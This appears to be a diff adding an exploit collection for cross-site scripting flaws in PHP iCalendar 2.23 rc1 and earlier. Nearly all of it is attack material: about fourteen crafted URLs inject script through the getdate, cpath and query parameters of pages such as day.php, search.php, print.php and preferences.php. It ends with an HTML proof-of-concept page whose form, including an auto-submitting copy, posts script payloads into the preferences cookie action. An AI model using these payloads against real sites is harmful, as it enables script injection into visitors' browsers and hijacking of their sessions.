@@ -1,0 +1,111 @@
+http://www.example.com/phpicalendar/day.php?cal=all_calendars_combined971
+&amp;getdate=20061225&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;
+
+http://www.example.com/phpicalendar/month.php?cal=all_calendars_combined971
+&amp;getdate=20061225&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;
+
+http://www.example.com/phpicalendar/year.php?cal=all_calendars_combined971
+&amp;getdate=20061225&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;
+
+http://www.example.com/phpicalendar/week.php?cal=all_calendars_combined971
+&amp;getdate=20061225&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;
+
+http://www.example.com/phpicalendar/day.php?cpath=%22%3E%3Cscript%3Edocument.write(document.domain)%3C/script%3E
+&amp;getdate=20061225&amp;cal%5B%5D=Home&amp;cal%5B%5D=US%2BHolidays&amp;cal%5B%5D=Work
+
+http://www.example.com/phpicalendar/month.php?cpath=%22%3E%3Cscript%3Edocument.write(document.domain)%3C/script%3E
+&amp;getdate=20061225&amp;cal%5B%5D=Home&amp;cal%5B%5D=US%2BHolidays&amp;cal%5B%5D=Work
+
+http://www.example.com/phpicalendar/year.php?cpath=%22%3E%3Cscript%3Edocument.write(document.domain)%3C/script%3E
+&amp;getdate=20061225&amp;cal%5B%5D=Home&amp;cal%5B%5D=US%2BHolidays&amp;cal%5B%5D=Work
+
+http://www.example.com/phpicalendar/week.php?cpath=%22%3E%3Cscript%3Edocument.write(document.domain)%3C/script%3E
+&amp;getdate=20061225&amp;cal%5B%5D=Home&amp;cal%5B%5D=US%2BHolidays&amp;cal%5B%5D=Work
+
+http://www.example.com/phpicalendar/search.php?cpath=&amp;cal=Home%2CUS%2BHolidays%2CWork
+&amp;getdate=19700102&amp;query=ss&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&amp;submit.x=11&amp;submit.y=15
+
+http://www.example.com/phpicalendar/search.php?cpath=&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&amp;cal=Home
+%2CUS%2BHolidays%2CWork&amp;getdate=19700102&amp;query=ss&amp;submit.x=11&amp;submit.y=12
+
+http://www.example.com/phpicalendar/search.php?cpath=&amp;cal=Home%2CUS%2BHolidays%2CWork
+&amp;getdate=19700102&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&amp;query=ss&amp;submit.x=11&amp;submit.y=12
+
+http://www.example.com/phpicalendar/rss/index.php?cal=Home,US+Holidays,Work
+&amp;getdate=20061225&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;
+
+http://www.example.com/phpicalendar/print.php?cal=Home,US+Holidays,Work
+&amp;getdate=20061225%22%3E%3Cscript%3Ealert()%3C/script%3E&amp;printview=day
+
+http://www.example.com/phpicalendar/preferences.php?cal=Home,US+Holidays,Work
+&amp;getdate=20061227%22%3E%3Cscript%3Ealert()%3C/script%3E
+
+&amp;lt;html&amp;gt;
+&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;title&amp;gt;PHP icalendar XSS in preferences.php PoC&amp;lt;/title&amp;gt;
+&amp;lt;p&amp;gt;&amp;lt;a href=&amp;quot;http://phpicalendar.net/&amp;quot; target=&amp;quot;_BLANK&amp;quot;&amp;gt;PHP
+icalendar&amp;lt;/a&amp;gt; &amp;lt;= 2.23 rc1 preferences.php XSS Proof Of concept By &amp;lt;a
+href=&amp;quot;http://Lostmon.blogspot.com&amp;quot; target=&amp;quot;_BLANK&amp;quot;&amp;gt;Lostmon&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;
+&amp;lt;p&amp;gt;Modify the target host , by default http://localhost/&amp;lt;/P&amp;gt;
+&amp;lt;br /&amp;gt;&amp;lt;br /&amp;gt;&amp;lt;form method=&amp;#039;post&amp;#039;
+action=&amp;#039;http://localhost/phpicalendar/preferences.php?action=setcookie&amp;#039;&amp;gt;
+cookie_language: &amp;lt;input input=&amp;#039;text&amp;#039; value=&amp;#039;Spanish&amp;#039;
+name=&amp;#039;cookie_language&amp;#039; style=&amp;#039;width: 80%&amp;#039; /&amp;gt;&amp;lt;br&amp;gt;
+cookie_calendar: &amp;lt;input input=&amp;#039;text&amp;#039;
+value=&amp;#039;all_calendars_combined971&amp;#039; name=&amp;#039;cookie_calendar&amp;#039; style=&amp;#039;width:
+80%&amp;#039; /&amp;gt;&amp;lt;br&amp;gt;
+cpath: &amp;lt;input input=&amp;#039;text&amp;#039;
+value=&amp;#039;&amp;amp;lt;SCRIPT&amp;amp;gt;alert(String.fromCharCode(88,83,83))&amp;amp;lt;/SCRIPT&amp;amp;gt;&amp;#039;
+name=&amp;#039;cpath&amp;#039; style=&amp;#039;width: 80%&amp;#039; /&amp;gt;&amp;lt;br&amp;gt;
+cookie_view: &amp;lt;input input=&amp;#039;text&amp;#039; value=&amp;#039;day&amp;#039; name=&amp;#039;cookie_view&amp;#039;
+style=&amp;#039;width: 80%&amp;#039; /&amp;gt;&amp;lt;br&amp;gt;
+cookie_time: &amp;lt;input input=&amp;#039;text&amp;#039; value=&amp;#039;0700&amp;#039; name=&amp;#039;cookie_time&amp;#039;
+style=&amp;#039;width: 80%&amp;#039; /&amp;gt;&amp;lt;br&amp;gt;
+cookie_startday: &amp;lt;input input=&amp;#039;text&amp;#039; value=&amp;#039;Sunday&amp;#039;
+name=&amp;#039;cookie_startday&amp;#039; style=&amp;#039;width: 80%&amp;#039; /&amp;gt;&amp;lt;br&amp;gt;
+cookie_style: &amp;lt;input input=&amp;#039;text&amp;#039; value=&amp;#039;default&amp;#039; name=&amp;#039;cookie_style&amp;#039;
+style=&amp;#039;width: 80%&amp;#039; /&amp;gt;&amp;lt;br&amp;gt;
+unset: &amp;lt;input input=&amp;#039;text&amp;#039;
+value=&amp;#039;&amp;amp;lt;SCRIPT&amp;amp;gt;alert(String.fromCharCode(88,83,83))&amp;amp;lt;/SCRIPT&amp;amp;gt;&amp;#039;
+name=&amp;#039;unset&amp;#039; style=&amp;#039;width: 80%&amp;#039; /&amp;gt;&amp;lt;br&amp;gt;
+set: &amp;lt;input input=&amp;#039;text&amp;#039;
+value=&amp;#039;&amp;amp;lt;SCRIPT&amp;amp;gt;alert(String.fromCharCode(88,83,83))&amp;amp;lt;/SCRIPT&amp;amp;gt;&amp;#039;
+name=&amp;#039;set&amp;#039; style=&amp;#039;width: 80%&amp;#039; /&amp;gt;&amp;lt;br&amp;gt;
+&amp;lt;input type=&amp;#039;submit&amp;#039; value=&amp;#039;submit&amp;#039; /&amp;gt;&amp;lt;br&amp;gt;
+&amp;lt;/form&amp;gt;&amp;lt;hr /&amp;gt;
+&amp;lt;textarea style=&amp;#039;width: 80%; height: 50%;&amp;#039;&amp;gt;
+&amp;lt;form method=&amp;#039;post&amp;#039;
+action=&amp;#039;http://localhost/phpicalendar/preferences.php?action=setcookie&amp;#039;&amp;gt;
+cookie_language: &amp;lt;input input=&amp;#039;text&amp;#039; value=&amp;#039;Spanish&amp;#039;
+name=&amp;#039;cookie_language&amp;#039; style=&amp;#039;width: 80%&amp;#039; /&amp;gt;&amp;lt;br&amp;gt;
+cookie_calendar: &amp;lt;input input=&amp;#039;text&amp;#039;
+value=&amp;#039;all_calendars_combined971&amp;#039; name=&amp;#039;cookie_calendar&amp;#039; style=&amp;#039;width:
+80%&amp;#039; /&amp;gt;&amp;lt;br&amp;gt;
+cpath: &amp;lt;input input=&amp;#039;text&amp;#039;
+value=&amp;#039;&amp;amp;lt;SCRIPT&amp;amp;gt;alert(String.fromCharCode(88,83,83))&amp;amp;lt;/SCRIPT&amp;amp;gt;&amp;#039;
+name=&amp;#039;cpath&amp;#039; style=&amp;#039;width: 80%&amp;#039; /&amp;gt;&amp;lt;br&amp;gt;
+
+cookie_view: &amp;lt;input input=&amp;#039;text&amp;#039; value=&amp;#039;day&amp;#039; name=&amp;#039;cookie_view&amp;#039;
+style=&amp;#039;width: 80%&amp;#039; /&amp;gt;&amp;lt;br&amp;gt;
+cookie_time: &amp;lt;input input=&amp;#039;text&amp;#039; value=&amp;#039;0700&amp;#039; name=&amp;#039;cookie_time&amp;#039;
+style=&amp;#039;width: 80%&amp;#039; /&amp;gt;&amp;lt;br&amp;gt;
+cookie_startday: &amp;lt;input input=&amp;#039;text&amp;#039; value=&amp;#039;Sunday&amp;#039;
+name=&amp;#039;cookie_startday&amp;#039; style=&amp;#039;width: 80%&amp;#039; /&amp;gt;&amp;lt;br&amp;gt;
+cookie_style: &amp;lt;input input=&amp;#039;text&amp;#039; value=&amp;#039;default&amp;#039; name=&amp;#039;cookie_style&amp;#039;
+style=&amp;#039;width: 80%&amp;#039; /&amp;gt;&amp;lt;br&amp;gt;
+unset: &amp;lt;input input=&amp;#039;text&amp;#039;
+value=&amp;#039;&amp;amp;lt;SCRIPT&amp;amp;gt;alert(String.fromCharCode(88,83,83))&amp;amp;lt;/SCRIPT&amp;amp;gt;&amp;#039;
+name=&amp;#039;unset&amp;#039; style=&amp;#039;width: 80%&amp;#039; /&amp;gt;&amp;lt;br&amp;gt;
+set: &amp;lt;input input=&amp;#039;text&amp;#039;
+value=&amp;#039;&amp;amp;lt;SCRIPT&amp;amp;gt;alert(String.fromCharCode(88,83,83))&amp;amp;lt;/SCRIPT&amp;amp;gt;&amp;#039;
+name=&amp;#039;set&amp;#039; style=&amp;#039;width: 80%&amp;#039; /&amp;gt;&amp;lt;br&amp;gt;
+&amp;lt;input type=&amp;#039;submit&amp;#039; value=&amp;#039;submit&amp;#039; /&amp;gt;&amp;lt;br&amp;gt;
+&amp;lt;/form&amp;gt;
+&amp;amp;lt;script&amp;amp;gt;
+document.forms[0].submit()
+&amp;amp;lt;/script&amp;amp;gt;
+&amp;lt;/textarea&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+
